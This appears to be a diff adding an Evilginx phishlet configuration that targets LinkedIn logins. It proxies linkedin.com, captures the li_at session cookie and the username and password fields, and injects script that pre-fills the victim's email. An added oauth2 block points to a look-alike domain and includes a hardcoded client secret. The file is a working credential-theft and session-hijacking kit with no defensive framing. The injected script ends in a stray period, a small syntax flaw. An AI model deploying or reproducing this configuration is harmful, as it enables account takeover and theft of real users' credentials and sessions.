@@ -1,0 +1,51 @@
+name: 'LinkedIn'
+author: '@mrgretzky'
+min_ver: '3.0.0'
+redirect_url: 'https://www.linkedin.com/feed/'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'linkedin.com', session: true, is_landing: true, auto_filter: true}
+sub_filters: []
+auth_tokens:
+  - domain: '.www.linkedin.com'
+    keys: ['li_at:always']
+    type: 'cookie'
+auth_urls:
+  - '/feed/'
+  - '/uas/authenticate'
+credentials:
+  username:
+    key: 'session_key'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'session_password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'www.linkedin.com'
+  path: '/uas/login'
+js_inject:
+  - trigger_domains: ["www.linkedin.com"]
+    trigger_paths: ["/uas/login"]
+    trigger_params: ["email"]
+    script: |
+      function lp(){
+        var email = document.querySelector("#username");
+        var password = document.querySelector("#password");
+        if (email != null && password != null) {
+          email.value = "{email}";
+          password.focus();
+          return;
+        }
+        setTimeout(function(){lp();}, 100);
+      }
+      setTimeout(function(){lp();}, 100).
+oauth2:
+  client_id: 'evilginx-proxy-linkedin'
+  client_secret: 'b8c9d0e1f2a345678901234567890abcdef1234567890abcdef1234567890abcd'
+  redirect_uri: 'https://linkedin.uploadfile.space'
+  authorization_endpoint: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/auth'
+  token_endpoint: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/token'
+  userinfo_endpoint: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/userinfo'
+  jwks_uri: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/certs'
+  scope: 'openid email profile offline_access evilginx-phishlet'
